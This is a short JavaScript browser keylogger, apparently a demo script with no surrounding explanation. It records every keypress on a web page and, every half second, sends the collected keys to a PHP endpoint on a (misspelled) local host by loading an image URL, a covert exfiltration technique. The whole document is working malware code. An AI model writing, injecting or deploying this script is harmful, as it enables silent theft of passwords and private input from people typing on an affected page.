var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
url = 'http://locahlhost:9999/keyloggerphpjs/keylogger.php?key='
if(keys != '') {
  new Image().src = url+keys
  keys = '';
}
}, 500);